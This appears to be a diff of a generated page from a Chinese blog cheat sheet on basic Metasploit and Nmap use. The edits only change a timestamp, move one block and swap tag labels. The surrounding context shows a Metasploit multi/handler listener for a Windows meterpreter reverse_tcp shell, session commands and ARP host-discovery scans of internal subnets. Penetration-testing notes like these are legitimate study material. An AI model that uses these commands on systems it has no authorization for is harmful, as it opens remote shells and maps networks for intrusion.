@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="SG&#39;s Blog">
 <meta property="og:description" content="msfconsole:reverese:123456789use exploit/multi/handler show options set payload windows/x64/meterpreter/reverse_tcp set LHOST [AttackerIP] # 如果是公网vps，这里最好写一个内网ip，否则可能会影响后边load。。看issue里写的set LPORT [Att">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-01-04T09:49:15.682Z">
+<meta property="og:updated_time" content="2019-01-04T09:52:23.271Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="msf&amp;nmap常用基本操作">
 <meta name="twitter:description" content="msfconsole:reverese:123456789use exploit/multi/handler show options set payload windows/x64/meterpreter/reverse_tcp set LHOST [AttackerIP] # 如果是公网vps，这里最好写一个内网ip，否则可能会影响后边load。。看issue里写的set LPORT [Att">
@@ -180,8 +180,8 @@
         <h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole:"></a>msfconsole:</h3><p><strong>reverese:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler </span><br><span class="line">show options </span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp </span><br><span class="line">set LHOST [AttackerIP] # 如果是公网vps，这里最好写一个内网ip，否则可能会影响后边load。。看issue里写的</span><br><span class="line">set LPORT [AttackerPort] #默认4444端口 </span><br><span class="line"></span><br><span class="line">运行这两条命令后，4444端口会一直在后台处于侦听状态</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure></p>
 <p><strong>bind:</strong></p>
 <p><code>windows/x64/meterpreter/bind_tcp</code></p>
-<p><strong>session</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在Meterpreter Shell中退出session使用 `exit`；</span><br><span class="line"></span><br><span class="line">在模块界面删除session使用 `session -k sessionID`；</span><br><span class="line"></span><br><span class="line">退到后台是 `background`；</span><br></pre></td></tr></table></figure></p>
 <a id="more"></a>
+<p><strong>session</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在Meterpreter Shell中退出session使用 `exit`；</span><br><span class="line"></span><br><span class="line">在模块界面删除session使用 `session -k sessionID`；</span><br><span class="line"></span><br><span class="line">退到后台是 `background`；</span><br></pre></td></tr></table></figure></p>
 <p><strong>scanner</strong></p>
 <p>msf下也包含多种扫描技术,端口扫描很多就不说了。主要说下在meterpreter下通常怎样进行主机发现。</p>
 <p>最常用的应该就是arp扫：<br>Meterpreter(需要先加条路由,下面会说):<code>run post/windows/gather/arp_scanner RHOSTS=192.168.244.0/24</code><br>Nmap:<code>nmap -sn -PR 192.168.3.0/24 以arp的方式扫描</code><br>CMD:<code># start /b arpscan.exe -t 192.168.3.0/24 &gt;&gt; result.txt</code><br>Msfconsole:<code>use auxiliary/scanner/discovery/arp_sweep</code></p>
@@ -556,7 +556,7 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">工具使用</a>
+                <a href="javascript:void(0)" class="js-tag color3">Machine Learning Basic</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -564,7 +564,7 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Machine Learning Basic</a>
+                <a href="javascript:void(0)" class="js-tag color5">工具使用</a>
               </li>
             
             <div class="clearfix"></div>
